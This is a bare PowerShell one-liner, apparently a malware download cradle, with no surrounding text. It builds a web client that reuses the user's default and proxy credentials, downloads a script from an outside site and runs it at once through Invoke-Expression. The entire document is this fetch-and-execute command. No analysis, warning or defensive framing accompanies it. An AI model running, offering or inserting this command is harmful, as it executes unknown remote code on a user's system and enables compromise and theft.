
$w=new-object net.webclient;$w.UseDefaultCredentials=$true;$w.Proxy.Credentials=$w.Credentials;iex($w.downloadstring('https://topbrains.it/article/c-bat'))

